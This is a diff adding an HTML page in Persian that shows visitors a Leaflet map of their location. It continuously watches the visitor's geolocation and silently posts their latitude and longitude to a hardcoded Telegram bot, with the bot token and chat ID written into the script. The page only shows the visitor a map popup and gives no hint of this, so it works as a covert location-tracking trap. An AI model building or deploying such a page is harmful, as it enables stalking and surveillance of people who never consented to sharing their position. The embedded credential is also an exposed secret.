@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>نقشه با موقعیت کاربر</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet.markercluster/1.4.1/MarkerCluster.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet.markercluster/1.4.1/MarkerCluster.Default.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet.markercluster/1.4.1/leaflet.markercluster.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        #map {
+            height: 770px;
+        }
+    </style>
+</head>
+<body>
+    <div id="map"></div>
+
+    <script>
+        var map = L.map('map').setView([35.69673308019178, 51.37941671516353], 13);
+
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap contributors'
+        }).addTo(map);
+
+        var markers = L.markerClusterGroup();
+
+        function onLocationFound(e) {
+            var radius = e.accuracy / 2;
+
+            var marker = L.marker(e.latlng).bindPopup("شما در شعاع " + radius + " متری این نقطه قرار دارید");
+            markers.addLayer(marker);
+            map.addLayer(markers);
+
+            // ارسال موقعیت مکانی به ربات تلگرام
+            $.ajax({
+                url: 'https://api.telegram.org/bot6285880703:AAGotHqcwNjwWS3sW-rHeGNy2GnSo4RKlPw/sendLocation',
+                method: 'POST',
+                data: {
+                    chat_id: '5005040392',
+                    latitude: e.latlng.lat,
+                    longitude: e.latlng.lng
+                },
+                success: function(response) {
+                    console.log('موقعیت مکانی با موفقیت به ربات تلگرام ارسال شد');
+                },
+                error: function(error) {
+                    console.error('خطا در ارسال موقعیت مکانی به ربات تلگرام', error);
+                }
+            });
+        }
+
+        function onLocationError(e) {
+            alert(e.message);
+        }
+
+        map.on('locationfound', onLocationFound);
+        map.on('locationerror', onLocationError);
+
+        map.locate({setView: true, maxZoom: 16, watch: true});
+    </script>
+</body>
+</html>
